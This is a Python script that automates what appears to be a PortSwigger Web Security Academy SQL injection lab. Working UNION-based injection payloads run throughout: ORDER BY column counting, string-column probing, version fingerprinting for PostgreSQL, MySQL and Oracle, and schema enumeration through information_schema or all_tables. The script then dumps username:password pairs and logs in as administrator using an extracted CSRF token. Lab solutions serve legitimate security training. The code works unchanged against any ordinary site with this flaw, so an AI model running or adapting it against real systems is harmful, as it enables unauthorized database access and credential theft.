import sys
import warnings
from typing import List, Optional
from urllib.parse import urljoin

from bs4 import BeautifulSoup
from requests import RequestException, Response
from requests.sessions import Session

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.db_engine = "generic"
        self.is_oracle = False
        self.category = "Gifts"

    def _send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[Response]:
        """Hanldes all low-level HTTP communication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except RequestException:
            return None

    def _validated_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
        stage: str = "unknown",
    ) -> Response:
        """Wrapper gracefully exits in unexpected error"""
        res = self._send_request(endpoint, params, data, method)
        if res is None:
            print(f"[-] State [{stage}]: Connection error")
            sys.exit(1)
        elif res.status_code != 200:
            print(f"[-] Stage [{stage}]: Received HTTP {res.status_code}!")
            print(f"[*] Failed Payload context: {params or data}")
            sys.exit(1)
        return res

    def is_alive(self) -> bool:
        print("[*] Phase 1: Checking if URL is alive...")
        res = self._validated_request("", stage="recon-user-check")
        return "academyLabBanner" in res.text

    def harvest_category(self) -> Optional[str]:
        print("[*] Phase 2: Harvesting valid filter categories...")
        res = self._validated_request("", stage="recon-harvest-category")
        soup = BeautifulSoup(res.text, "html.parser")
        categories = []
        for tag in soup.find_all("a", class_="filter-category"):
            name = tag.get_text(strip=True)
            if "All" not in name:
                categories.append(name)
        return min(categories, key=len) if categories else None

    def get_table_width(self) -> int:
        print("[*] Phase 3: Determining table width...")

        for i in range(1, 11):
            payload = f"{self.category}' ORDER BY {i} -- "
            res = self._send_request("filter", params={"category": payload})
            if res is not None and res.status_code != 200:
                return i - 1
        return 0

    def map_string_indices(self, col_count: int) -> List[int]:
        print("[*] Phase 4: Mapping string-compatible columns & detecting Oracle...")
        # Oracle detection
        nulls = ["NULL"] * col_count
        payload = f"{self.category}' UNION SELECT {','.join(nulls)} FROM DUAL -- "
        oracle_test = self._send_request("filter", params={"category": payload})
        if oracle_test is not None and oracle_test.status_code == 200:
            self.is_oracle = True
            self.db_engine = "oracle"
            print("[+] Oracle detected (FROM DUAL requirement active)")
        # Map string-compatible columns
        indices = []
        suffix = "FROM DUAL" if self.db_engine == "oracle" else ""
        for i in range(col_count):
            cols = ["NULL"] * col_count
            cols[i] = "'asif_probe'"
            payload = f"{self.category}' UNION SELECT {','.join(cols)} {suffix} -- "
            res = self._send_request("filter", params={"category": payload})
            if res is not None and "asif_probe" in res.text:
                indices.append(i)
        return indices

    def extract_data(self, html_content: str) -> List[str]:
        """Universal parser for reflected UNION results"""
        headers = []
        soup = BeautifulSoup(html_content, "html.parser")
        # Results reflected in <th> tags within product table
        # Since, we are doing this in first index, <td> is not present
        for th in soup.find_all("th"):
            td = th.find_next_sibling("td")
            if td:
                continue
            headers.append(th.get_text(strip=True))
        return headers

    def detect_db_engine(self, count: int, indices: List[int]) -> bool:
        print("[*] Phase 5: Fingerprinting Database Engine...")

        probes = {
            "postgresql": "version()",
            "mysql_mssql": "@@version",
            "oracle": "banner FROM v$version",
        }

        for engine, func in probes.items():
            cols = ["NULL"] * count
            cols[indices[0]] = func
            suffix = "FROM DUAL" if engine == "oracle" else ""
            payload = f"{self.category}' UNION SELECT {','.join(cols)} {suffix} -- "
            res = self._send_request("filter", params={"category": payload})
            if res and res.status_code == 200:
                self.db_engine = engine
                print(f"[+] Database Engine confirmed: {engine.upper()}")
                engine_version = self.extract_data(res.text)
                print(f"[+] Database Engine version: {engine_version[0]}")
                return True
        return False

    def exfiltrate_and_parse_creds(
        self, col_count: int, col_indices: List[int]
    ) -> dict[str, str]:
        print("[*] Phase 6: Dumping Schema & Credentials...")
        # Determine table and column registry information
        table_reg = "all_tables" if self.is_oracle else "information_schema.tables"
        col_reg = "all_tab_columns" if self.is_oracle else "information_schema.columns"

        # 1. Extract User Table
        cols = ["NULL"] * col_count
        cols[col_indices[0]] = "table_name"
        payload = f"{self.category}' UNION SELECT {','.join(cols)} FROM {table_reg} -- "
        res = self._validated_request(
            "filter", params={"category": payload}, stage="table_dump"
        )
        tables = self.extract_data(res.text)
        user_table = next((t for t in tables if "users" in t.lower()), None)

        if not user_table:
            print("[-] Error: Could not find user table")
            sys.exit(1)
        print(f"[+] identified user table: {user_table}")

        # 2. Extract Columns
        cols[col_indices[0]] = "column_name"
        where_clause = (
            f"WHERE table_name='{user_table.upper() if self.is_oracle else user_table}'"
        )
        payload = f"{self.category}' UNION SELECT {','.join(cols)} FROM {col_reg} {where_clause} -- "
        res = self._validated_request(
            "filter", params={"category": payload}, stage="column_name"
        )
        columns = self.extract_data(res.text)
        u_col = next((c for c in columns if "username" in c.lower()), None)
        p_col = next((c for c in columns if "password" in c.lower()), None)

        if not u_col or not p_col:
            print(f"[-] Error: Could not find credential columns in {user_table}")
            sys.exit(1)

        # 3. Extract Credentials
        cols[col_indices[0]] = f"{u_col} || ':' || {p_col}"
        payload = (
            f"{self.category}' UNION SELECT {','.join(cols)} FROM {user_table} -- "
        )
        res = self._validated_request(
            "filter", params={"category": payload}, stage="creds_dump"
        )
        raw_creds = self.extract_data(res.text)

        if not raw_creds:
            print(f"[-] Error: Could not dump credentials from {user_table}")
            sys.exit(1)

        creds_dict = {}
        for line in raw_creds:
            u, p = line.split(":", 1)
            creds_dict[u.strip()] = p.strip()
        return creds_dict

    def authenticate_and_verify(self, username: str, password: str) -> bool:
        print(f"[*] Phase 7: Attempting to login as {username}...")

        # Step 1. Load login page and extract CSRF token
        res = self._validated_request("login", stage="load-login-page")
        soup = BeautifulSoup(res.text, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        csrf_token = str(csrf_tag.get("value")) if csrf_tag else None

        if not csrf_token:
            print("[-] Error: Could not find CSRF token in login page")
            sys.exit(1)

        print(f"[+] Extracted CSRF Token: {csrf_token}")

        # Step 2: Attempt login
        login_data = {
            "csrf": csrf_token,
            "username": username,
            "password": password,
        }
        self._validated_request(
            "login", data=login_data, method="POST", stage=f"login-{username}"
        )

        # Check Final State
        res = self._validated_request("", stage="validate-solve")
        if res is not None and "Congratulation" in res.text:
            return True
        return False

    def solve(self):
        # Check if Lab URL is still active
        if not self.is_alive():
            print("[-] The PortSwigger Lab URL is nto reacherable or has expired!")
            return

        # Extract categories
        category = self.harvest_category()
        if not category:
            print("[-] Could not find a valid category!")
            return
        self.category = category
        print(f"[+] Target category identified: {category}")

        # Determine column count
        col_count = self.get_table_width()
        if col_count == 0:
            print("[-] Could not determine table width!")
            return
        print(f"[+] Table width: {col_count}")

        # Map string-compatible column
        col_indices = self.map_string_indices(col_count)
        if not col_indices:
            print("[-] Need atleast one string-compatible column!")
            return

        # Fingerprint DB Engine
        engine = self.detect_db_engine(col_count, col_indices)
        if not engine:
            print("[-] Could not fingerprint DB!")
            return

        # Dump DB and extract administrator creds
        creds = self.exfiltrate_and_parse_creds(col_count, col_indices)
        if not creds:
            print("[-] Could not exfiltrate credentials!")
            return

        # Attempt login and verify
        if self.authenticate_and_verify("administrator", creds["administrator"]):
            print("[!] SUCCESS: Logged in and Lab Solved!")
        else:
            print("[-] Lab is not solved!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()
    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
